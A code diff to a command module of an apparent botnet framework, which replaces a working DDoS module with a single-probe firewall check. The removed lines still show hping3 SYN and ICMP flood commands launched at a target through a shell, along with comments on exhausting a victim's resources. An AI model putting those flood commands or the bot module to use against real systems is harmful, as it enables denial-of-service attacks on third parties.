@@ -1,66 +1,173 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'DDoS Attack Module (Build Your Own Botnet Simulation)'
+'DDoS Compatibility Module (Build Your Own Botnet Simulation)'
 
 # standard library
+import os
+import shlex
+import socket
 import subprocess
+
+# utilities
+import util
 
 # globals
 command = True
-packages = []
-platforms = ['win32','linux2','darwin']
-usage = 'ddos [target_ip] [type=syn/icmp]'
+packages = ['util']
+platforms = ['win32', 'linux', 'linux2', 'darwin']
+usage = 'ddos [target_ip] [type=syn/icmp] [port]'
 description = """
-Thực hiện tấn công từ chối dịch vụ phân tán (DDoS) sử dụng kỹ thuật 
-ICMP Flood hoặc SYN Flood để kiểm tra khả năng chịu tải của hệ thống [4, 5].
+Compatibility wrapper for the legacy ddos command.
+Instead of generating flood traffic, this module performs a limited firewall
+probe using either a TCP connect check ("syn") or a single ICMP echo ("icmp").
 """
 
-# main
-def run(action=""):
+
+def _parse_action(action):
     """
-    Khởi chạy đợt tấn công DDoS dựa trên các thông số thực nghiệm [5].
-    
-    Args:
-        action: Chuỗi chứa "<target_ip> <type>" (ví dụ: "192.168.1.100 syn")
-                Nếu action trống, sử dụng giá trị mặc định.
-    
-    Returns:
-        Chuỗi kết quả thực thi lệnh.
+    Parse a legacy ddos command string into a safe probe request.
+
+    Supported examples:
+      "192.168.1.10"
+      "192.168.1.10 syn"
+      "192.168.1.10 syn 443"
+      "example.com icmp"
+    """
+    parts = shlex.split(action) if isinstance(action, str) and action.strip() else []
+
+    target = parts[0] if len(parts) >= 1 else '127.0.0.1'
+    probe_type = parts[1].lower() if len(parts) >= 2 else 'syn'
+    port = parts[2] if len(parts) >= 3 else '80'
+
+    if probe_type == 'tcp':
+        probe_type = 'syn'
+
+    if probe_type not in ('syn', 'icmp'):
+        raise ValueError("invalid probe type '{}'; use 'syn' or 'icmp'".format(probe_type))
+
+    if probe_type == 'syn':
+        if not str(port).isdigit():
+            raise ValueError("invalid TCP port '{}'".format(port))
+        port = int(port)
+        if port < 1 or port > 65535:
+            raise ValueError("TCP port must be between 1 and 65535")
+    else:
+        port = None
+
+    return target, probe_type, port
+
+
+def _resolve_target(target):
+    """
+    Resolve a target hostname/IP and return the first usable address.
     """
     try:
-        # Phân tích tham số từ action string
-        parts = action.strip().split() if action else []
-        
-        if len(parts) >= 2:
-            target = parts[0]
-            attack_type = parts[1]
-        elif len(parts) == 1:
-            target = parts[0]
-            attack_type = "syn"  # Mặc định là SYN nếu không chỉ định
-        else:
-            target = "10.0.0.20"
-            attack_type = "syn"
-        
-        # Xây dựng lệnh dựa trên loại tấn công
-        if attack_type.lower() == "syn":
-            # SYN Flood: Sử dụng gói tin TCP SYN, kích thước 100,000 bytes, Window size 64 [5].
-            # Mục tiêu: Làm cạn kiệt tài nguyên CPU của nạn nhân (có thể lên tới 90%) [6, 7].
-            cmd = "hping3 -S {} -p 80 --flood -d 100000 -w 64".format(target)
-            
-        elif attack_type.lower() == "icmp":
-            # ICMP Flood: Gửi gói tin ICMP liên tục với kích thước phần thân 1500 bytes [5].
-            # Mục tiêu: Làm tràn băng thông mạng của mục tiêu [5, 8].
-            cmd = "hping3 -1 --flood -d 1500 {}".format(target)
-            
-        else:
-            return "Loại tấn công không hợp lệ. Sử dụng 'syn' hoặc 'icmp'. Received: {}".format(attack_type)
+        info = socket.getaddrinfo(target, None, 0, socket.SOCK_STREAM)
+    except socket.gaierror as exc:
+        raise ValueError("unable to resolve target '{}': {}".format(target, exc))
 
-        # Thực thi lệnh thông qua subprocess để không làm treo luồng chính của bot [9].
-        # Lưu ý: Cần quyền sudo/root trên host để chạy hping3 [3, 10].
-        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        return "Đã khởi động tấn công {} flood vào mục tiêu {} (PID: {}) [11, 12].".format(
-            attack_type.upper(), target, process.pid)
+    if not info:
+        raise ValueError("unable to resolve target '{}'".format(target))
 
-    except Exception as e:
-        return "{} error: {}".format(run.__name__, str(e))
+    family, _, _, _, sockaddr = info[0]
+    address = sockaddr[0]
+    return family, address
+
+
+def _tcp_probe(target, port, timeout=3):
+    """
+    Perform a bounded TCP connect probe and classify the result.
+    """
+    family, address = _resolve_target(target)
+    sock = socket.socket(family, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+
+    try:
+        result = sock.connect_ex((address, port))
+        if result == 0:
+            state = 'open'
+            details = 'TCP connect succeeded'
+        elif result in (111, 61, 10061):
+            state = 'closed'
+            details = 'connection refused'
+        else:
+            state = 'filtered_or_unreachable'
+            details = 'connect_ex returned {}'.format(result)
+    except socket.timeout:
+        state = 'filtered_or_timed_out'
+        details = 'connection attempt timed out'
+    except Exception as exc:
+        state = 'error'
+        details = str(exc)
+    finally:
+        sock.close()
+
+    return address, state, details
+
+
+def _ping_command(address):
+    """
+    Build a single-echo ping command for the current platform.
+    """
+    if os.name == 'nt':
+        return ['ping', '-n', '1', '-w', '2000', address]
+    return ['ping', '-c', '1', '-W', '2', address]
+
+
+def _icmp_probe(target):
+    """
+    Perform a single ICMP echo request using the system ping command.
+    """
+    _, address = _resolve_target(target)
+    cmd = _ping_command(address)
+
+    try:
+        process = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            universal_newlines=True
+        )
+    except OSError as exc:
+        return address, 'error', "ping command unavailable: {}".format(exc)
+
+    output = (process.stdout or process.stderr or '').strip().splitlines()
+    details = output[-1] if output else 'no diagnostic output'
+
+    if process.returncode == 0:
+        state = 'reachable'
+    else:
+        state = 'blocked_or_unreachable'
+
+    return address, state, details
+
+
+def run(action=""):
+    """
+    Run a safe network probe while preserving the legacy ddos entrypoint.
+
+    Args:
+        action: Command string in the form "<target> <syn|icmp> [port]".
+
+    Returns:
+        str: Probe result summary.
+    """
+    try:
+        target, probe_type, port = _parse_action(action)
+
+        if probe_type == 'syn':
+            address, state, details = _tcp_probe(target, port)
+            return (
+                "TCP probe complete: target={} resolved={} port={} state={} details={}"
+                .format(target, address, port, state, details)
+            )
+
+        address, state, details = _icmp_probe(target)
+        return (
+            "ICMP probe complete: target={} resolved={} state={} details={}"
+            .format(target, address, state, details)
+        )
+    except ValueError as exc:
+        return "Error: {}. Usage: {}".format(exc, usage)
+    except Exception as exc:
+        return "{} error: {}".format(run.__name__, str(exc))
